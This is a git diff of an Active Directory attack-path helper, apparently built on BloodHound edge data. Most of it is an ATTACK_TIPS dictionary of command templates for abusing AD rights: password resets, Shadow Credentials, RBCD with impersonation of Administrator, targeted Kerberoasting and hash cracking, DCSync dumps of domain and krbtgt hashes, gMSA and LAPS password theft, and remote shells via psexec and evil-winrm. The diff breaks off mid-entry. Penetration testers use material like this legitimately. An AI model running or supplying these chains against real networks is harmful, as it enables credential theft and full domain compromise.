@@ -25,9 +25,10 @@ CRITICAL_RIGHTS = {
     'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner', 'Owns',
     'ForceChangePassword', 'DCSync', 'AddKeyCredentialLink',
     'WriteSPN', 'ReadGMSAPassword', 'AllExtendedRights',
-    'WriteAccountRestrictions', 'AddSelf', 'AddMember',
-    'GetChanges', 'GetChangesAll', 'ReadLAPSPassword',
-    'SyncLAPSPassword', 'Contains', 'GpLink',
+    'WriteAccountRestrictions', 'AddAllowedToAct', 'AllowedToAct',
+    'AddSelf', 'AddMember',
+    'GetChanges', 'GetChangesAll', 'GetChangesInFilteredSet', 'ReadLAPSPassword',
+    'SyncLAPSPassword', 'WriteGPLink', 'Contains', 'GpLink',
 }
 
 NOISE = {
@@ -43,9 +44,14 @@ SEVERITY = {
     'WriteDacl': 3, 'WriteOwner': 4, 'Owns': 5, 'ForceChangePassword': 6,
     'GenericWrite': 7, 'AllExtendedRights': 8, 'WriteSPN': 9,
     'ReadGMSAPassword': 10, 'AddKeyCredentialLink': 11,
-    'WriteAccountRestrictions': 12, 'AddSelf': 13, 'AddMember': 14,
-    'ReadLAPSPassword': 15, 'SyncLAPSPassword': 15,
+    'WriteAccountRestrictions': 12, 'AddAllowedToAct': 12, 'AllowedToAct': 12,
+    'GetChangesInFilteredSet': 12, 'AddSelf': 13, 'AddMember': 14,
+    'WriteGPLink': 13, 'ReadLAPSPassword': 15, 'SyncLAPSPassword': 15,
     'Contains': 90, 'GpLink': 90,
+}
+
+RIGHT_ALIASES = {
+    'LAPSRead': 'ReadLAPSPassword',
 }
 
 KNOWN_SIDS = {
@@ -56,208 +62,726 @@ KNOWN_SIDS = {
 }
 
 ATTACK_TIPS = {
-'ForceChangePassword': """bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
-# From Kerberos ccache:
+'ForceChangePassword': """=== CORE IDEA ===
+# Reset TARGET user's password without knowing the current password.
+# This changes the account state and can break services if TARGET is a service account.
+
+=== RESET PASSWORD ===
+# bloodyAD with explicit credentials:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
+
+# bloodyAD with Kerberos ccache:
 KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST set password TARGET 'NewPass123!'
-# net rpc:
+
+# Samba net rpc alternative:
 net rpc password TARGET 'NewPass123!' -U DOMAIN/USER%PASS -S DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword""",
 
-'GenericAll': """# On a user - password reset:
+=== AFTERWARD ===
+# Use the new password only where TARGET actually has access:
+nxc smb TARGET_HOST -u TARGET -p 'NewPass123!'
+# Password resets commonly generate Windows event 4724 on the DC.
+SOURCE: https://bloodhound.specterops.io/resources/edges/force-change-password""",
+
+'GenericAll': """=== TARGET = USER ===
+# Password reset:
 bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
-# Shadow credentials (if AD CS is present):
+# Shadow Credentials (if PKINIT is usable; often cleaner than changing the password):
 certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-# On a computer - RBCD:
-impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write DOMAIN/USER:PASS -dc-ip DC_IP
-# On a group:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember 'GROUP' USER
-SOURCE: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse""",
 
-'GenericWrite': """# SPN write -> Kerberoast:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/spn'
-impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
-hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
-# Shadow Credentials:
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting""",
+=== TARGET = GROUP ===
+# Add the owned/current user to the controlled group:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET USER
 
-'WriteDacl': """impacket-dacledit -action write -rights FullControl -principal USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add dcsync USER
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/grant-rights""",
-
-'WriteOwner': """# 1. Owner change:
-impacket-owneredit -action write -new-owner USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-# 2. WriteDacl → FullControl:
-impacket-dacledit -action write -rights FullControl -principal USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/grant-rights""",
-
-'Owns': """impacket-owneredit -action write -new-owner USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-impacket-dacledit -action write -rights FullControl -principal USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/grant-rights""",
-
-'AddSelf': """bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember 'TARGET_GROUP' USER
-net rpc group addmem 'TARGET_GROUP' USER -U DOMAIN/USER%PASS -S DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/addself""",
-
-'AddMember': """bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember 'TARGET_GROUP' USER
-KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST add groupMember 'Domain Admins' USER
-net rpc group addmem 'TARGET_GROUP' USER -U DOMAIN/USER%PASS -S DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/addmember""",
-
-'WriteSPN': """=== SPN-JACKING (constrained delegation + WriteSPN) ===
-# 1. Move the SPN to the target computer:
-addspn.py -u 'DOMAIN\\USER' -p PASS -t 'TARGET$' --spn 'http/WEB01.DOMAIN' DC_IP
-# 2. S4U2Self + S4U2Proxy → altservice:
-impacket-getST -spn 'http/WEB01.DOMAIN' -impersonate Administrator -altservice 'cifs/DC_HOST' DOMAIN/USER:PASS -dc-ip DC_IP
-# 3. DCSync:
-export KRB5CCNAME=Administrator@cifs_DC.ccache
-impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/Administrator@DC_HOST -dc-ip DC_IP
-=== SIMPLE Kerberoast ===
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/spn'
-impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking""",
-
-'ReadGMSAPassword': """nxc ldap DC_IP -u USER -p PASS --gmsa
-nxc ldap DC_IP -u USER -H NTLM_HASH --gmsa
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword
-python3 gMSADumper.py -u USER -p PASS -d DOMAIN -l DC_IP
-evil-winrm -i DC_IP -u 'GMSA_ACCOUNT$' -H NTLM_HASH
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword""",
-
-'AddKeyCredentialLink': """# certipy (simpler, auto cleanup):
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-# pywhisker manually:
-pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action add --filename shadow_out
-python3 PKINITtools/gettgtpkinit.py -cert-pfx shadow_out.pfx -pfx-pass <pw> DOMAIN/TARGET TARGET.ccache
-python3 PKINITtools/getnthash.py -key <AS-REP-key> DOMAIN/TARGET
-# Cleanup:
-pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action remove --device-id <ID>
-SOURCE: https://github.com/ShutdownRepo/pywhisker""",
-
-'AllExtendedRights': """# Password reset:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
-# LAPS read (if computer):
-nxc ldap DC_IP -u USER -p PASS --laps
-# Shadow Credentials:
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-SOURCE: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse""",
-
-'WriteAccountRestrictions': """=== RBCD ===
-# 1. Fake computer account:
-impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' DOMAIN/USER:PASS -dc-ip DC_IP
-# 2. Set RBCD:
-impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write DOMAIN/USER:PASS -dc-ip DC_IP
-# 3. S4U → ticket:
-impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator DOMAIN/'FAKE01$':FakePass123! -dc-ip DC_IP
-# 4. PTT → secretsdump:
-export KRB5CCNAME=Administrator@cifs_TARGET.ccache
+=== TARGET = COMPUTER ===
+# RBCD path. Requires a controlled computer/service account; create one if MachineAccountQuota allows it:
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
+# Allow FAKE01$ to impersonate users to TARGET$:
+impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
+# Request a CIFS ticket as a privileged user to the target computer:
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
+export KRB5CCNAME=Administrator.ccache
 impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd""",
 
-'DCSync': """impacket-secretsdump -just-dc-ntlm 'DOMAIN/USER:PASS'@DC_IP
-impacket-secretsdump -just-dc-ntlm -k -no-pass DOMAIN/Administrator@DC_HOST
+=== TARGET = DOMAIN OBJECT ===
+# GenericAll on the domain root includes the replication rights needed for DCSync:
+impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
+SOURCE: https://bloodhound.specterops.io/resources/edges/generic-all""",
+
+'GenericWrite': """=== TARGET = USER ===
+# Shadow Credentials: write msDS-KeyCredentialLink and authenticate as TARGET.
+certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
+
+# Targeted Kerberoast: add an SPN to TARGET, request a TGS, then crack it.
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/TARGET'
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+=== TARGET = GROUP ===
+# Add the owned/current user to the controlled group:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET USER
+
+=== TARGET = COMPUTER ===
+# Shadow Credentials can also target computer accounts; keep the trailing $ if needed.
+certipy shadow auto -u USER@DOMAIN -p PASS -account 'TARGET$' -dc-ip DC_IP
+
+# RBCD path. Requires a controlled computer/service account; create one if MachineAccountQuota allows it:
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
+impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP
+
+=== TARGET = GPO / OU / DOMAIN ===
+# GenericWrite may enable GPO modification or gPLink abuse; use the dedicated GPO/gPLink workflow for that object.
+SOURCE: https://bloodhound.specterops.io/resources/edges/generic-write""",
+
+'WriteDacl': """=== CORE IDEA ===
+# WriteDacl lets you edit the target object's DACL.
+# Practical shortcut: grant your controlled principal GenericAll/FullControl, then follow the GenericAll path for that target type.
+
+=== TARGET = USER / COMPUTER / GROUP / GPO ===
+# Grant FullControl to the controlled/current user:
+impacket-dacledit -action write -rights FullControl -principal USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS
+# Equivalent bloodyAD shortcut:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add genericAll TARGET USER
+
+# Next step depends on target type:
+# USER     -> reset password, Shadow Credentials, or targeted Kerberoast
+# GROUP    -> add USER to TARGET
+# COMPUTER -> Shadow Credentials or RBCD
+# GPO      -> modify the GPO / use a GPO abuse workflow
+
+=== TARGET = DOMAIN OBJECT ===
+# Prefer granting only DCSync rights when the target is the domain root:
+impacket-dacledit -action write -rights DCSync -principal USER -target DOMAIN -dc-ip DC_IP DOMAIN/USER:PASS
+# Equivalent bloodyAD shortcut:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add dcsync USER
+# Then dump:
+impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
+
+=== TARGET = OU / CONTAINER ===
+# FullControl can be inherited by child objects if inheritance is enabled and the ACE is written with inheritance flags:
+impacket-dacledit -action write -rights FullControl -principal USER -target-dn 'OU=TARGET,DC=DOMAIN,DC=LOCAL' -inheritance -dc-ip DC_IP DOMAIN/USER:PASS
+SOURCE: https://bloodhound.specterops.io/resources/edges/write-dacl""",
+
+'WriteOwner': """=== CORE IDEA ===
+# WriteOwner lets you take ownership of TARGET.
+# Once you own TARGET, you can edit its DACL, grant yourself control, then follow the GenericAll path.
+
+# 1. Change TARGET owner to the controlled/current user:
+impacket-owneredit -action write -new-owner USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS
+
+# 2. As owner, grant FullControl to the controlled/current user:
+impacket-dacledit -action write -rights FullControl -principal USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS
+
+# 3. Continue based on target type:
+# USER     -> reset password, Shadow Credentials, or targeted Kerberoast
+# GROUP    -> add USER to TARGET
+# COMPUTER -> Shadow Credentials or RBCD
+# DOMAIN   -> grant DCSync rights / dump with secretsdump
+
+=== DOMAIN OBJECT SHORTCUT ===
+# After taking ownership of the domain root, grant DCSync rights instead of broad FullControl:
+impacket-dacledit -action write -rights DCSync -principal USER -target DOMAIN -dc-ip DC_IP DOMAIN/USER:PASS
+impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
+SOURCE: https://bloodhound.specterops.io/resources/edges/write-owner""",
+
+'Owns': """=== CORE IDEA ===
+# You already own TARGET. Object owners can usually edit the security descriptor.
+# Grant yourself control, then follow the GenericAll path for that target type.
+
+# Grant FullControl to the controlled/current user:
+impacket-dacledit -action write -rights FullControl -principal USER -target TARGET -dc-ip DC_IP DOMAIN/USER:PASS
+
+# Equivalent bloodyAD shortcut if you prefer:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add genericAll TARGET USER
+
+# Continue based on target type:
+# USER     -> reset password, Shadow Credentials, or targeted Kerberoast
+# GROUP    -> add USER to TARGET
+# COMPUTER -> Shadow Credentials or RBCD
+# DOMAIN   -> grant DCSync rights / dump with secretsdump
+
+=== NOTE ===
+# Some environments can limit implicit owner rights (OWNER RIGHTS / BlockOwnerImplicitRights).
+# If DACL modification fails, verify whether BloodHound reports OwnsLimitedRights/WriteOwnerLimitedRights instead.
+SOURCE: https://bloodhound.specterops.io/resources/edges/owns""",
+
+'AddSelf': """=== CORE IDEA ===
+# AddSelf lets the controlled/current principal add itself to TARGET_GROUP.
+# After the add, refresh the logon token / get a new Kerberos ticket before expecting inherited rights.
+
+=== ADD CURRENT USER TO GROUP ===
+# bloodyAD:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET_GROUP USER
+
+# Kerberos ccache:
+KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST add groupMember TARGET_GROUP USER
+
+# Samba net rpc alternative:
+net rpc group addmem TARGET_GROUP USER -U DOMAIN/USER%PASS -S DC_IP
+
+=== VERIFY / REFRESH ===
+# Verify membership, then re-authenticate or request a fresh TGT:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object TARGET_GROUP --attr member
+impacket-getTGT DOMAIN/USER:PASS -dc-ip DC_IP
+# Group membership changes commonly generate Windows event 4728 for global security groups.
+SOURCE: https://bloodhound.specterops.io/resources/edges/add-self""",
+
+'AddMember': """=== CORE IDEA ===
+# AddMember lets the controlled principal add arbitrary principals to TARGET_GROUP.
+# Most abuse paths add the owned/current user, but another controlled user/computer can be added too.
+
+=== ADD A PRINCIPAL TO GROUP ===
+# Add USER to TARGET_GROUP:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember TARGET_GROUP USER
+
+# Kerberos ccache:
+KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST add groupMember TARGET_GROUP USER
+
+# Samba net rpc alternative:
+net rpc group addmem TARGET_GROUP USER -U DOMAIN/USER%PASS -S DC_IP
+
+=== VERIFY / REFRESH ===
+# Verify membership, then refresh USER's token / get a fresh TGT:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object TARGET_GROUP --attr member
+impacket-getTGT DOMAIN/USER:PASS -dc-ip DC_IP
+# Group membership changes commonly generate Windows event 4728 for global security groups.
+SOURCE: https://bloodhound.specterops.io/resources/edges/add-member""",
+
+'WriteSPN': """=== TARGET = USER ===
+# WriteSPN lets you write servicePrincipalName on the target user.
+# Primary abuse: targeted Kerberoast.
+
+# 1. Add a unique fake SPN to TARGET:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/TARGET'
+
+# 2. Request only TARGET's TGS hash, then crack it offline:
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request-user TARGET -outputfile kerberoast.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+# If the TGS is AES, use mode 19600 (etype 17) or 19700 (etype 18).
+
+# 3. Cleanup. If TARGET had no original SPNs, delete the attribute you added:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName
+# If TARGET had existing SPNs, restore the original servicePrincipalName list instead.
+
+=== OPTIONAL: SPN-JACKING CONTEXT ===
+# SPN-jacking is a separate chain. It also requires a KCD/delegation scenario and,
+# for live SPN-jacking, rights to remove the SPN from its current owner.
+# Do not treat WriteSPN alone as enough for KCD abuse or DCSync.
+SOURCE: https://bloodhound.specterops.io/resources/edges/write-spn""",
+
+'ReadGMSAPassword': """=== CORE IDEA ===
+# The controlled principal can retrieve the managed password for TARGET gMSA.
+# The useful output is usually the gMSA NT hash; use it like a normal account hash where the gMSA has access.
+
+=== READ / CONVERT THE GMSA PASSWORD ===
+# NetExec:
+nxc ldap DC_IP -u USER -p PASS --gmsa
+nxc ldap DC_IP -u USER -H NTLM_HASH --gmsa
+
+# gMSADumper:
+python3 gMSADumper.py -u USER -p PASS -d DOMAIN -l DC_IP
+
+# bloodyAD can read the raw managed password blob, but you still need to decode it:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword
+
+=== USE THE GMSA HASH ===
+# Kerberos TGT / pass-the-cache:
+impacket-getTGT DOMAIN/'GMSA_ACCOUNT$' -hashes :NT_HASH -dc-ip DC_IP
+export KRB5CCNAME='GMSA_ACCOUNT$.ccache'
+
+# Use only against hosts/services where the gMSA has rights:
+nxc smb TARGET_IP -u 'GMSA_ACCOUNT$' -H NT_HASH
+impacket-psexec -k -no-pass DOMAIN/'GMSA_ACCOUNT$'@TARGET_HOST
+SOURCE: https://bloodhound.specterops.io/resources/edges/read-gmsa-password""",
+
+'AddKeyCredentialLink': """=== CORE IDEA ===
+# AddKeyCredentialLink lets you write msDS-KeyCredentialLink on TARGET.
+# Primary abuse: Shadow Credentials -> authenticate as TARGET via Kerberos PKINIT.
+
+=== CERTIPY AUTO FLOW ===
+# Works for user or computer targets; keep the trailing $ for computer accounts.
+certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
+
+=== MANUAL PYWHISKER / PKINIT FLOW ===
+# 1. Add a new KeyCredential and save the generated certificate:
+pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action add --filename shadow_out
+
+# 2. Request a TGT as TARGET using PKINIT:
+python3 PKINITtools/gettgtpkinit.py -cert-pfx shadow_out.pfx -pfx-pass <PFX_PASS> DOMAIN/TARGET TARGET.ccache
+export KRB5CCNAME=TARGET.ccache
+
+# 3. Optional: recover TARGET's NT hash from the AS-REP key printed by gettgtpkinit:
+python3 PKINITtools/getnthash.py -key <AS_REP_KEY> DOMAIN/TARGET
+
+# 4. Cleanup the added KeyCredential after use:
+pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action remove --device-id <DEVICE_ID>
+
+=== NOTE ===
+# If the KDC cannot do PKINIT, the write may succeed but authentication will fail.
+SOURCE: https://bloodhound.specterops.io/resources/edges/add-key-credential-link""",
+
+'AllExtendedRights': """=== CORE IDEA ===
+# AllExtendedRights grants all control-access extended rights on the target object.
+# It is not the same as GenericAll; abuse depends heavily on the target type.
+
+=== TARGET = USER ===
+# Force password reset without knowing the old password:
+bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
+
+=== TARGET = COMPUTER ===
+# Read LAPS password for the target computer:
+impacket-GetLAPSPassword -computer TARGET$ -dc-ip DC_IP DOMAIN/USER:PASS
+# Then use the local Administrator password where applicable:
+evil-winrm -i TARGET -u Administrator -p 'LAPS_PASSWORD'
+
+=== TARGET = DOMAIN OBJECT ===
+# AllExtendedRights on the domain root includes the replication rights needed for DCSync:
+impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
+
+=== TARGET = CERTIFICATE TEMPLATE ===
+# May grant enrollment rights on the template, if CA/template issuance requirements are also satisfied:
+certipy req -u USER@DOMAIN -p PASS -ca CA-NAME -target DC_HOST -template TARGET
+SOURCE: https://bloodhound.specterops.io/resources/edges/all-extended-rights""",
+
+'WriteAccountRestrictions': """=== CORE IDEA ===
+# WriteAccountRestrictions can modify account restriction attributes on TARGET.
+# The important BloodHound abuse is writing msDS-AllowedToActOnBehalfOfOtherIdentity -> RBCD.
+# Destination is normally a computer object. The delegating account must have an SPN.
+
+=== RBCD WITH A CONTROLLED COMPUTER ===
+# 1. Create a controlled computer if you do not already own an SPN-bearing account:
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
+
+# 2. Allow FAKE01$ to act on behalf of other users to TARGET$:
+impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
+
+# 3. Request a service ticket as a delegable user to TARGET:
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
+export KRB5CCNAME=<generated_ticket>.ccache
+
+# 4. Use the ticket against TARGET:
+impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
+impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP
+
+=== CHECKS / LIMITS ===
+# Protected Users or accounts marked sensitive for delegation cannot be impersonated.
+# If MachineAccountQuota is 0, use an already-controlled SPN-bearing account instead of creating FAKE01$.
+SOURCE: https://bloodhound.specterops.io/resources/edges/write-account-restrictions""",
+
+'AddAllowedToAct': """=== CORE IDEA ===
+# AddAllowedToAct means you can modify msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET computer.
+# Practical abuse: add a controlled SPN-bearing account to TARGET's RBCD security descriptor, then use S4U.
+# This is the "write the RBCD setting" step.
+
+=== RBCD WRITE + ABUSE ===
+# 1. Create a controlled computer if you do not already own an SPN-bearing account:
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
+
+# 2. Add FAKE01$ to TARGET$'s msDS-AllowedToActOnBehalfOfOtherIdentity:
+impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
+
+# 3. Request a ticket as a delegable user to TARGET:
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
+export KRB5CCNAME=<generated_ticket>.ccache
+
+# 4. Use the ticket:
+impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
+
+=== CHECKS / LIMITS ===
+# The delegating account must have an SPN. Computer accounts naturally do.
+# Protected Users / sensitive-for-delegation users cannot normally be impersonated.
+SOURCE: https://bloodhound.specterops.io/resources/edges/add-allowed-to-act""",
+
+'AllowedToAct': """=== CORE IDEA ===
+# AllowedToAct means TARGET already allows the source principal to perform RBCD to it.
+# This is the "RBCD already configured" state; you usually do not need to write the attribute again.
+# The source principal must have an SPN and be controlled by you.
+
+=== REQUEST AND USE TICKET ===
+# Request a service ticket as a delegable user to TARGET:
+impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'SOURCE$':'SOURCE_PASSWORD'
+export KRB5CCNAME=<generated_ticket>.ccache
+
+# Use the ticket against TARGET:
+impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
+impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP
+
+=== CHECKS / LIMITS ===
+# Protected Users / sensitive-for-delegation users cannot normally be impersonated.
+# If SOURCE is not controlled, AllowedToAct is context, not usable access.
+SOURCE: https://bloodhound.specterops.io/resources/edges/allowed-to-act""",
+
+'DCSync': """=== CORE IDEA ===
+# DCSync means the principal has the replication rights needed to ask a DC for password material.
+# BloodHound creates this edge from GetChanges + GetChangesAll on the domain object.
+
+=== DUMP DOMAIN HASHES ===
+# NTLM hashes only:
+impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
+# Kerberos auth / pass-the-cache:
+impacket-secretsdump -just-dc-ntlm -k -no-pass DOMAIN/USER@DC_HOST -dc-ip DC_IP
+# NetExec alternative:
 nxc smb DC_IP -u USER -p PASS --ntds
-impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc-user krbtgt
-SOURCE: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync""",
 
-'GetChangesAll': """# GetChanges + GetChangesAll are required on the Domain object -> DCSync:
-impacket-secretsdump -just-dc-ntlm 'DOMAIN/USER:PASS'@DC_IP
-nxc smb DC_IP -u USER -p PASS --ntds
-SOURCE: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync""",
+=== TARGETED DUMP ===
+# krbtgt hash for Golden Ticket workflows:
+impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
+# Single user:
+impacket-secretsdump -just-dc-user TARGETUSER DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP
+SOURCE: https://bloodhound.specterops.io/resources/edges/dc-sync""",
 
-'GetChanges': """# Grants DCSync rights together with GetChangesAll:
-impacket-secretsdump -just-dc-ntlm 'DOMAIN/USER:PASS'@DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync""",
+'GetChangesAll': """=== PARTIAL DCSYNC RIGHT ===
+# GetChangesAll alone is not enough for DCSync.
+# DCSync requires GetChanges + GetChangesAll on the domain object.
+# BloodHound may also create a separate DCSync edge when the complete combination exists.
 
-'ReadLAPSPassword': """nxc ldap DC_IP -u USER -p PASS --laps
-nxc ldap DC_IP -u USER -p PASS -M laps
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'COMPUTER$' --attr ms-MCS-AdmPwd
+=== WHAT TO CHECK ===
+# Look for a matching GetChanges edge for the same principal -> same domain object.
+# If only GetChangesAll is present, treat it as a sensitive dependency, not a ready dump path.
+SOURCE: https://bloodhound.specterops.io/resources/edges/get-changes-all""",
+
+'GetChanges': """=== PARTIAL DCSYNC RIGHT ===
+# GetChanges alone is not enough for DCSync.
+# DCSync requires GetChanges + GetChangesAll on the domain object.
+# GetChanges + GetChangesInFilteredSet can instead indicate SyncLAPSPassword.
+
+=== WHAT TO CHECK ===
+# Look for a matching GetChangesAll edge for the same principal -> same domain object.
+# If the complete pair exists, use the DCSync workflow.
+SOURCE: https://bloodhound.specterops.io/resources/edges/get-changes""",
+
+'GetChangesInFilteredSet': """=== PARTIAL DIRSYNC RIGHT ===
+# GetChangesInFilteredSet allows synchronization of the Filtered Attribute Set.
+# It is not abuseable by itself.
+# BloodHound may create SyncLAPSPassword when GetChanges + GetChangesInFilteredSet are both present on the domain object.
+
+=== WHAT TO CHECK ===
+# Look for a matching GetChanges edge for the same principal -> same domain object.
+# If the complete pair exists, use the SyncLAPSPassword workflow.
+# If only GetChangesInFilteredSet is present, treat it as a sensitive dependency, not a ready LAPS read path.
+SOURCE: https://bloodhound.specterops.io/resources/edges/get-changes-in-filtered-set""",
+
+'SyncLAPSPassword': """=== CORE IDEA ===
+# SyncLAPSPassword means the principal can use DirSync-style replication to retrieve confidential/RODC-filtered attributes.
+# Practically, this can expose LAPS passwords such as classic ms-Mcs-AdmPwd.
+# BloodHound derives this from GetChanges + GetChangesInFilteredSet on the domain object.
+
+=== DIRSYNC LAPS READ ===
+# Windows / DirSync-style workflow:
+Sync-LAPS -LDAPFilter '(samaccountname=TARGET$)'
+
+# Scope to a known target computer where possible:
